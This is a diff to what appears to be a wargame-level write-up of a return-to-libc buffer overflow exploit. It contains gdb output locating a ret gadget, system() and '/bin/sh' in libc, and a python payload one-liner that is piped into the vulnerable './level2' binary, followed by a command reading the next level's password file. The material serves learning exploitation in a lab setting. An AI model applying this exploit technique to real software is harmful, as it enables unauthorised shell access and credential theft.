@@ -11,7 +11,10 @@ but this time we also see that check ensures that the return address is not over
 0x80484fb <p+39>:	and    eax,0xb0000000
 0x8048500 <p+44>:	cmp    eax,0xb0000000
 ```
-
+We find the address of the ret instruction:
+```
+0x804853e <p+106>:	ret
+```
 
 We will bypass this check using a return-to-libc exploit. First, we find the address of the system function in libc:
 ```
@@ -27,10 +30,6 @@ To get the "/bin/sh" string to pass in, were going to have find it inside of lib
 ```
 (gdb) find &system, +9999999, "/bin/sh"
 0xb7f8cc58
-```
-Next, we find the address of the ret instruction:
-```
-0x804853e <p+106>:	ret
 ```
 We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
 ```
@@ -51,7 +50,7 @@ Next, we need to construct the payload to exploit the vulnerability using the fo
 buffer + return address + system function address + fake return address + "/bin/sh" address from libc
 ```
 ```
-$ python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "4242" + "\x58\xcc\xf8\xb7"' > /tmp/payload2
+$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'") > /tmp/payload2
 $ cat /tmp/payload2 - | ./level2
 $ cat /home/user/level3/.pass
 
